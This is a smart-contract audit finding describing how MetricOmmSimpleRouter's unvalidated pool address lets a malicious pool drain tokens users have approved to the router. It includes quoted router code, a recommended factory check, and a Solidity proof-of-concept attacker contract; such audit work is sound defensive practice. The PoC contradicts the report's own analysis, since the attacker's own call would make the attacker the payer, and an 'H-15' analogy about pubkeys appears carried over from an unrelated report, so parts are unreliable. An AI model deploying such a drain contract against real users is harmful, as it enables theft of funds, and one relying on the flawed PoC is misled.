### Title
Unvalidated Pool Address in `metricOmmSwapCallback` Allows Malicious Pool to Drain User-Approved Tokens — (`File: metric-periphery/contracts/MetricOmmSimpleRouter.sol`)

---

### Summary

`MetricOmmSimpleRouter` stores the caller-supplied pool address as the sole authority for callback authentication. It verifies that the callback caller matches the expected pool (internal consistency), but never verifies that the expected pool was deployed by the canonical factory. An attacker who supplies a malicious pool address can cause the router to pay an arbitrary amount of the user's approved tokens to the attacker's contract.

---

### Finding Description

In `exactInputSingle`, `exactOutputSingle`, and `exactInput`/`exactOutput`, the router stores the user-supplied `params.pool` address as the expected callback caller via `_setNextCallbackContext`:

```solidity
// MetricOmmSimpleRouter.sol line 71
_setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
```

The callback guard `_requireExpectedCallbackCaller(msg.sender)` then only checks that `msg.sender` equals the stored value — i.e., that the caller is the pool the user nominated:

```solidity
// MetricOmmSimpleRouter.sol line 49
_requireExpectedCallbackCaller(msg.sender);
```

There is no check that `params.pool` is a pool deployed by the factory. The path validator `_validatePath` enforces only array-length invariants:

```solidity
// MetricOmmSimpleRouter.sol lines 239-244
if (
  tokens.length < 2 || pools.length != tokens.length - 1 || extensionDatas.length != pools.length
    || pools.length > MAX_PATH_POOLS
) {
  revert InvalidPath();
}
```

No factory membership check is performed anywhere in the router.

When the callback fires, `_justPayCallback` pays from the stored payer (the original `msg.sender`, i.e., the victim) to `msg.sender` (the malicious pool):

```solidity
// MetricOmmSimpleRouter.sol lines 193-198
pay(
  _getTokenToPay(),
  _getPayer(),
  msg.sender,
  uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
);
```

The malicious pool controls `amount0Delta` and `amount1Delta` entirely, so it can report any amount up to the victim's approval limit.

This is the direct analog of H-15: in H-15 the signature is verified against the supplied pubkey but the pubkey is not verified to belong to the claimed inferer; here the callback caller is verified against the supplied pool address but the pool address is not verified to belong to the factory.

---

### Impact Explanation

A victim who has approved the router to spend token T calls `exactOutputSingle` (or any swap entry point) with a pool address supplied by an attacker (e.g., via a compromised front-end or malicious aggregator). The malicious pool:

1. Receives the `swap()` call from the router.
2. Calls `router.metricOmmSwapCallback(victimApprovalAmount, 0, "")` — the guard passes because `msg.sender == expected pool`.
3. The router executes `pay(tokenIn, victim, maliciousPool, victimApprovalAmount)`, transferring the full approved balance from the victim to the attacker.
4. Returns fabricated deltas from `swap()` that satisfy the router's output-amount check.

The victim loses their entire approved token balance and receives nothing. This is a direct, complete loss of user principal with no recovery path.

---

### Likelihood Explanation

Any user who interacts with the router through a front-end that does not independently verify pool addresses on-chain is exposed. Compromised front-ends, malicious aggregators, and phishing sites are realistic and historically common attack vectors in DeFi. The router itself provides no on-chain protection. Likelihood is **Medium** (requires the victim to be directed to a malicious pool address) with **Critical** impact per interaction.

---

### Recommendation

Add a factory membership check before accepting any pool address as a callback authority. In each swap entry point, after receiving `params.pool`, verify:

```solidity
require(IMetricOmmPoolFactory(FACTORY).isPool(params.pool), "UnknownPool()");
```

Alternatively, enforce the check inside `_setNextCallbackContext` or `_requireExpectedCallbackCaller` so that no code path can set an unvalidated pool as the expected callback caller. The factory already knows every pool it deployed (via CREATE2 or an explicit registry), so the check is cheap and deterministic.

---

### Proof of Concept

```solidity
// Attacker deploys this contract
contract MaliciousPool {
    address router;
    address token;
    uint256 drainAmount;

    constructor(address _router, address _token, uint256 _drain) {
        router = _router; token = _token; drainAmount = _drain;
    }

    // Called by the router as if this were a real pool
    function swap(address, bool, int128, uint128, bytes calldata, bytes calldata)
        external returns (int128, int128)
    {
        // Step 1: call the callback — router pays drainAmount from victim to us
        IMetricOmmSwapCallback(router).metricOmmSwapCallback(
            int256(drainAmount), 0, ""
        );
        // Step 2: return fake deltas that satisfy the router's output check
        return (0, -int128(int256(drainAmount)));
    }
}

// Attacker calls:
router.exactOutputSingle(ExactOutputSingleParams({
    pool:             address(maliciousPool),   // <-- unvalidated
    tokenIn:          USDC,
    recipient:        attacker,
    deadline:         block.timestamp + 1,
    zeroForOne:       true,
    amountOut:        drainAmount,
    amountInMaximum:  drainAmount,              // victim's full approval
    priceLimitX64:    0,
    extensionData:    ""
}));
// Result: victim loses `drainAmount` USDC; attacker receives it.
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L46-62)
```text
  function metricOmmSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external override {
    if (amount0Delta <= 0 && amount1Delta <= 0) revert InvalidSwapDeltas();

    _requireExpectedCallbackCaller(msg.sender);

    uint8 callbackMode = _getCallbackMode();

    if (callbackMode == CALLBACK_MODE_JUST_PAY) {
      _justPayCallback(amount0Delta, amount1Delta);
      return;
    }
    if (callbackMode == CALLBACK_MODE_EXACT_OUTPUT_ITERATE) {
      _exactOutputIterateCallback(amount0Delta, amount1Delta, data);
      return;
    }
    revert InvalidCallbackMode(callbackMode);
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L130-147)
```text
  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    int128 expectedAmountOut = MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountOut);
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(params.recipient, params.zeroForOne, -expectedAmountOut, priceLimitX64, "", params.extensionData);
    int128 amountOut = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    if (amountOut != expectedAmountOut) revert InvalidOutputAmount(amountOut, params.amountOut);

    amountIn = MetricOmmSwapInputs.int128ToUint128(
      MetricOmmSwapResults.extractAmountIn(params.zeroForOne, amount0Delta, amount1Delta)
    );

    if (amountIn > params.amountInMaximum) revert InputTooHigh(amountIn, params.amountInMaximum);
    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L235-245)
```text
  function _validatePath(address[] calldata tokens, address[] calldata pools, bytes[] calldata extensionDatas)
    internal
    pure
  {
    if (
      tokens.length < 2 || pools.length != tokens.length - 1 || extensionDatas.length != pools.length
        || pools.length > MAX_PATH_POOLS
    ) {
      revert InvalidPath();
    }
  }
```
